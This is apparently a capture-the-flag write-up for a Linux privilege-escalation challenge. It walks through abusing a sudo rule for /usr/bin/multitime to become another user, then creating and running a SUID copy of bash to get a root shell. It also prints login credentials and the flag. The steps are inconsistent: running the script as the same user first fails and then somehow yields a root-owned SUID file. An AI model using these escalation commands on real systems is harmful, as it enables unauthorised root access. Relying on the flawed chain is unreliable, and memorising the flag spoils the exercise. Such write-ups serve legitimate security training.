# Web Privilege Escalation Time

We are given SSH credentials for user time on port 2023:

```bsh
ssh time@ctf-18.security.cs.pub.ro -p 2023
# Password: EDBVCjNFAAzYedCX
```

After logging in, we check for sudo privileges:

```bash
sudo -l
```

Output: `User time may run the following commands on time: \n (wormhole) /usr/bin/multitime`
This means user time can run /usr/bin/multitime as wormhole. We use this to spawn a shell:

```bash
sudo -u wormhole /usr/bin/multitime /bin/bash
```

Now we are wormhole. Listing `ls -la /home/wormhole` the home directory reveals a script: `-rwxrwxr-x 1 wormhole wormhole   75 Jul 22 13:29 time-travel.py`

Script contents:

```python
import os; os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")
```

This copies */bin/bash* to */tmp/rootbash* and makes it **SUID**, meaning it will execute with root privileges. Running it directly as wormhole fails:

```bash
python3 /home/wormhole/time-travel.py
# cp: cannot create regular file '/tmp/rootbash': Permission denied
```

We run it via sudo from time: `sudo -u wormhole /usr/bin/multitime python3 /home/wormhole/time-travel.py`

Check if the file was created and has the correct permissions:

```bash
ls -l /tmp/rootbash
# -rwsr-sr-x 1 root root ...
```

Now we execute the root shell: `/tmp/rootbash -p`

Inside the root shell, retrieve the flag: `cat /root/flag.txt`. Flag: **SSS{y0u_4r3_k1ll1ng_t1m3}**
